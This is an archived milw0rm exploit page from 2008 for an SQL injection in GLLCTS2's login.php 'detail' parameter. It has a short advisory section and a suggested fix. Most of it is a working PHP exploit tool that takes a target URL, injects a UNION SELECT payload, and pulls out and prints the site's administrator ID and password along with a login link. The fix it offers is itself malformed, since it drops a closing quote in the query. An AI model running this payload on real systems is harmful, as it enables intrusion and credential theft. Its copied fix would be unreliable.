<html><head><title>GLLCTS2 <= 4.2.4 (login.php detail) SQL Injection Exploit</title></head><pre>&lt;?php
/*
08000000088@M@@@M@2ZZZ8@aZX;ii,,:,iir777777777777777777777777r;i:,     i   ,@X:i:0a7 BMMM88000000000
08888888882aMMMMM,SZZ0WZ                         ........          7a2MMMMM      :   MMM@aZ888888888
08888888888WMMMMM78aSXi XBMMMMMMMMMMMMMM2: MB.X:.             ,SMMMMMMMMMMMM.    r:  MMM0a8888888888
0888888888ZZMMMMS  :          .:i;X28MMMMMMMM,22Z2XSaSir7ii2MMMMMMM@Z222Z0BMMM    iZMMMM8Z8888888888
088888888882BMMM :MSMMMMMMMMMM@@WB80MMMMMMMM  ,;r7XXXSSX.SMMM, .:ZMMMMMMBX.         MMMM8a8888888888
08888888888a2MMM8MMW   MM              ,,ZMMMM          i@B:WMMMMMMB8Z8MMMMMMMMMMX  ZMMWaZ8888888888
088888888ZZaS@MZiiMMMMMB:a@MMMMMMMMMMMM@ZX:aMMMMMM:MMMM0MMMM         iXa8ri ;MMMMMMMMMMBS88888888888
0888888Za8MMMMM ,ZMMMMM,SaaZM2 ;M.Mr  XM;SWW MMMMMMMMMMMMB,7ZMMMZMaMMZ. ;BBM  MMZXSMMMMBS2a888888888
088888ZZMMM0XMMXMMMSMMa;aaaBa  M8M@ M   MBi2 MMMMMMMMMMMM.2ZZ8M  MMM7 S  @M@  .MMMMM XMMMMMZZ8888888
088888a@M     MMM   @MSraa8MX   ;7Z@       X MMMM    BMMMiaMMMM.  SXaX  .2ZM   MMMM MMM   MM8Z888888
088888aMa Ma   MW    M@i0MMM 7Sr.   :r7i.    MMM  ,:  MMM;8           .i,,.iri MMM  MM rMB MMa888888
08888Z2MSMMMMM BZ    MMrW                rr ;MM  ,::, @MMaM          :XX7,     MM   MM ;XMM Ma888888
08888Z2MXW M  MMX     MMB       T    :XZa.  MM  :.::: :MM         D           2MM   Z7 ;. M,Ma888888
088888aMi  M MMMMrB    MM            .i.   MM. iW.::: :@MX                    MM   XM, ., MMWa888888
088888aM@  M MMMMiZ2    MM.               MM  :Za ::: r MM:                  MM    MMMM  aMM8Z888888
088888ZBM  M  MM SXB     MMM2          ZMMM  X2a;.:::.,X MMM                MM    aMMMM  MMMaZ888888
0888888ZMM  M  M B7a8     r2MMMMMMMMMMMMM7  aSXZ ,:::: i; ,MMMX         .@MMM7:    MMMM 0MMZa8888888
0888888Z8M;  M M W7XZZ     :;77X2Z8aX,    iaX77a ::::::  Mr  aMMMMMMMMMMMMMi ,0;  MMMM .MMZa88888888
08888888a@M  ZM  @X7X8r                   WX77Xa ::::,,,  Mi      SaS7i..,rrXXW  :MM @@MMWaZ88888888
088888888aMMMB   ZS77X07                 .2   ,S ,::..:   MZS               220  ZaS  BMM2Z888888888
0888888888aZMM   ia777X0       R          MMMMX      ; S. MM,      T       020  SX,;Mr M028888888888
08888888888aaMB   i7777SW                  MMMMMM;:r,MMMMMMM              0aa8  W M    MBZ8888888888
088888888888a0MMMM ;rrrr2Z                  M   SM2SWM7  X;              ;ZXZ  .2 MMMMMMZZ8888888888
0800000000008ZaSaMi7XXXXSBr.,,,,,,,,,,,:rXS:  ,.  .:        :S:,,,,,,,,..B2SZ  2SrMMMBa2Z80000000000
\                                                                                                  /
|                                            TheDefaced.org                                        |
|__________________________________________________________________________________________________|
|                                                                                                  |
|                                              Presents...                                         |
|                                     Exploit - Vulnerability &amp; Fix                                |
|                                     SQL Injection in gllcts2 &gt;= 4.2.4                            |
| ------------------------------------------------------------------------------------------------ |
|                                             Description                                          |
| ------------------------------------------------------------------------------------------------ |
| The following script is used for displaying teamspeak information by users and allowing others   |
| to login to these servers and etc.                                                               |
|                                                                                                  |
| It's most commonly used by teamspeak hosting companys which makes it kinda bad that this exists. |
|                                                                                                  |
| ------------------------------------------------------------------------------------------------ |
|                                             Vulnerability                                        |
| ------------------------------------------------------------------------------------------------ |
| Although the following script has multiple sql injections there is only one which we really...   |
| Found to be useful enough to include inside of the exploit code.                                 |
|                                                                                                  |
| So that is the only one that we will go into detail with below...                                |
|                                                                                                  |
| If we go to login.php and view the line 20                                                       |                                                                                                 |
| We see the following code...                                                                     |
|                                                                                                  |
| &lt;?php                                                                                            |
|    $r = query(&quot;SELECT * FROM $dbtable1 WHERE server_id='$_GET[detail]'&quot;);                        |
| ?&gt;                                                                                               |
|                                                                                                  |
| If you understand php you can see from this that the code is not properly sanatized before being.|
| Put into the query and executed... The way it is currently would allow a remote attacker to...   |
| Add on SQL in order to preform a sql injection.                                                  |
|                                                                                                  |
| ------------------------------------------------------------------------------------------------ |
|                                                 FIX                                              |
| ------------------------------------------------------------------------------------------------ |
| Take the code at login.php line 20 and make it the following...                                  |
|                                                                                                  |
| &lt;?php                                                                                            |
| 	$userinput = mysql_real_escape_string($_GET[detail]);                                      |
| 	$r = query(&quot;SELECT * FROM $dbtable1 WHERE server_id='$userinput&quot;);                         |
| ?&gt;                                                                                               |
| ------------------------------------------------------------------------------------------------ |
|                                                CREDITS                                           |
| ------------------------------------------------------------------------------------------------ |
|   The vulnerability was discovered remotely by DeadlyData and Kap of TheDefaced Security Team    |
|   It was then looked at via source code and the script was fully audited to find it was more...  |
|   Vulnerable then we had thought in total there are about 5 un sanatized user based inputs.      |
|                                                                                                  |
|   Which may lead to more vulnerabilties such as other SQL injections or XSS flaws.               |
| ------------------------------------------------------------------------------------------------ |
|                                              EXPLOIT CODE...                                     |
| ------------------------------------------------------------------------------------------------ |
|                  !NOTE!: Requires Magic Quotes GPC is set to off in your php.ini settings.       |
|                                                                                                  |
\__________________________________________________________________________________________________/
*/
set_time_limit(0);
ignore_user_abort(0);

function add_html_space($count){

$out2 = str_repeat(&quot;&amp;nbsp;&quot;,$count);

return $out2;
}

function write_content($title,$desc,$content){
	
$out = &quot;&lt;div class='content'&gt;&lt;div class='item'&gt;&lt;h1&gt;$title&lt;/h1&gt;&lt;div class='descr'&gt;$desc&lt;/div&gt;&lt;br&gt;&lt;p&gt;$content&lt;/p&gt;&lt;/div&gt;&quot;;

return $out;
}

$title = &quot;GLLCTS2 =&gt; v4.2.4&quot;. add_html_space(1) .&quot; SQL Injection Exploit&quot;;
$header['banner'] = &quot;TD's ESystem&quot;;
$header['main'] = &quot;TD's Exploit System&quot;;

$menu['title'] = &quot;Exploit System&quot;;

$menu['title1'] = &quot;Esystem Home&quot;;
$menu['link1'] = &quot;?&quot;;



$menu = &quot;&lt;div class=\&quot;sidenav\&quot;&gt;&lt;h1&gt;&quot;.$menu['title'].&quot;&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;&lt;a href='&quot;.$menu['link1'].&quot;'&gt;&quot;.$menu['title1'].&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h1&gt;Links To TD&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=\&quot;http://www.thedefaced.org\&quot;&gt;Go To TheDefaced&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\&quot;http://www.thedefaced.org/forums/\&quot;&gt;Go To TheDefaced Forums&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&quot;;
$copyright = &quot;&lt;/div&gt;&lt;div class=\&quot;clearer\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;br&gt;&lt;div class=\&quot;footer\&quot;&gt;&amp;copy; 2004 - 2008 &lt;a href=\&quot;?\&quot;&gt;The&amp;nbsp;Defaced Security Team.&lt;/a&gt;&lt;br&gt;&amp;copy; 2008 $title By TheDefaced.org&lt;/div&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
$style = &quot;&lt;html&gt;&lt;head&gt;&lt;link rel=\&quot;stylesheet\&quot; type=\&quot;text/css\&quot; href=\&quot;http://thedefaced.org/default_orig.css\&quot; media=\&quot;screen\&quot;/&gt;&lt;title&gt;$title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\&quot;thedefaced\&quot;&gt;&lt;div class=\&quot;container\&quot;&gt;&lt;span&gt;&lt;div class=\&quot;main\&quot;&gt;&lt;div class=\&quot;header\&quot;&gt;&lt;div class=\&quot;title\&quot;&gt;&lt;font size=\&quot;0.1\&quot;&gt;&lt;a href=\&quot;http://www.thedefaced.org\&quot;&gt;$header[banner]&lt;/a&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/td&gt;&lt;/TABLE&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;/div&gt;&lt;div class=\&quot;footer\&quot;&gt;&lt;b&gt;$header[main]&lt;/a&gt;&lt;/b&gt;&lt;/div&gt;$menu&quot;;

echo $style;

switch($_GET['page']){

default:

If($_POST['inj'] == 'run'){
	
echo&quot;&lt;div class='content'&gt;&quot;;
echo&quot;&lt;div class='item'&gt;&lt;h1&gt;TD's Exploit System&lt;/h1&gt;&quot;;
echo&quot;&lt;div class='descr'&gt;Grabing Admin ID and Password via GLLC SQL injection.&lt;/div&gt;&quot;;
echo&quot;&lt;br&gt;&lt;p&gt;&quot;;

$url = $_POST['url'];
$prefix = $_POST['prefix'];

$buf = file_get_contents($url.&quot;/login.php?detail='%20union%20select%20all%201,2,3,4,5,6,7,8,9,10,11,concat(CHAR(124),CHAR(65,%2068,%2077,%2073,%2078,%2073,%2068,%2058),admin_id,CHAR(124),CHAR(80,%2065,%2083,%2083,%2058),admin_pass,CHAR(124)),13,14,15,16,17,18,19,20,21,22,23%20from%20&quot;.$prefix.&quot;_admin/*&quot;);
$arr = explode(&quot;|&quot;,$buf);
foreach($arr as $line){
if(eregi(&quot;ADMINID:&quot;, $line))
If($line !=$adminid){
$adminid = $line;
echo $adminid.&quot;&lt;br&gt;&quot;;
}
if(eregi(&quot;PASS:&quot;,$line))
If($pass == &quot;&quot;){
$pass = $line;
$pass_parsed = str_replace(&quot;PASS:&quot;,&quot;&quot;,$pass);
echo $pass.&quot;&lt;br&gt;&lt;br&gt;&quot;;
echo &quot;&lt;a href='$url/admin/index.php?pass=$pass_parsed'&gt;Login&lt;/a&gt;&quot;;
}
}

echo&quot;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;&lt;/div&gt;&quot;;
echo $copyright;	
}else{
echo write_content(&quot;Welcome to TD's Exploit System&quot;,&quot;SQL injection exploit in GLLCTS2&quot;,&quot;&lt;form method='post' action='?'&gt;&lt;center&gt;&lt;input type='hidden' name='inj' value='run'&gt;GLLCTS2 URL(No Trailing \&quot;/\&quot; &amp; Include \&quot;http://\&quot;):&lt;br&gt;&lt;input type='text' size='25' name='url'&gt;&lt;br&gt;&lt;br&gt;Table Prefix:&lt;br&gt;&quot;. add_html_space(1) .&quot;&lt;input type='text' size='20' name='prefix' value='gllcts2'&gt;&lt;br&gt;&lt;br&gt;&lt;input type='submit' value='Get Admin Info'&gt;&lt;/form&gt;&quot;);
echo $copyright;
}
break;
}
?&gt;

# milw0rm.com [2008-06-12]</pre></html>